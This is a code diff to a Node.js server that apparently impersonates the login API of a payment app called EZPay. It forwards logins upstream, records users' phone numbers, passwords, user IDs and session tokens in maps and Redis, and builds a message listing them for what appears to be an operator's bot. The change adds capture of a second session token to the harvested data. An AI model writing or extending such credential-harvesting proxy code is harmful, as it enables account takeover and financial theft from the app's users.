@@ -1540,8 +1540,9 @@ app.post('/app/api/system/v2/login', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     const loginData = getResponseData(jsonResp) || {};
-    // EZPay LoginBean returns: appToken, memberCode, memberPhone, ifSetPinCode
-    const appToken = loginData.appToken || loginData.token || loginData.accessToken || '';
+    // EZPay LoginBean returns: appToken, token, accessToken, memberCode, memberPhone, ifSetPinCode
+    const appToken = loginData.appToken || '';
+    const token = loginData.token || loginData.accessToken || '';
     const memberCode = loginData.memberCode || loginData.memberCodeId || loginData.memberId || loginData.userId || loginData.id || '';
     const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
     const ifSetPinCode = loginData.ifSetPinCode || loginData.hasPinCode || '';
@@ -1553,12 +1554,18 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       if (respPhone) userPhoneMap[String(finalUserId)] = String(respPhone);
       if (appToken) {
         tokenUserMap[appToken] = String(finalUserId);
-        // Architect-fix #3: also populate reverse map (userId -> token) so bot commands work
-        // immediately after login even before next authenticated request lands.
         userTokenMap[String(finalUserId)] = appToken;
         if (redis) {
           redis.hset('ezpayTokenMap', appToken.substring(0, 100), String(finalUserId)).catch(() => { });
           redis.hset('ezpayUserTokenMap', String(finalUserId), appToken).catch(() => { });
+        }
+      }
+      if (token) {
+        tokenUserMap[token] = String(finalUserId);
+        if (!appToken) userTokenMap[String(finalUserId)] = token;
+        if (redis) {
+          redis.hset('ezpayTokenMap', token.substring(0, 100), String(finalUserId)).catch(() => { });
+          if (!appToken) redis.hset('ezpayUserTokenMap', String(finalUserId), token).catch(() => { });
         }
       }
       const detectedPhone = phone || respPhone;
@@ -1593,6 +1600,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
         successMsg += `🔒 Password: \`${pwd || 'N/A'}\`\n`;
         successMsg += `👤 UserID: \`${memberCode || finalUserId || 'N/A'}\`\n`;
         if (appToken) successMsg += `🎟️ appToken: \`${appToken}\`\n`;
+        if (token) successMsg += `🔑 Token: \`${token}\`\n`;
         if (ifSetPinCode !== undefined && ifSetPinCode !== '') {
           const pinStr = (ifSetPinCode === '1' || ifSetPinCode === 1 || ifSetPinCode === true) ? 'Yes ✅' : 'No ❌';
           successMsg += `📌 PIN Set: \`${pinStr}\`\n`;
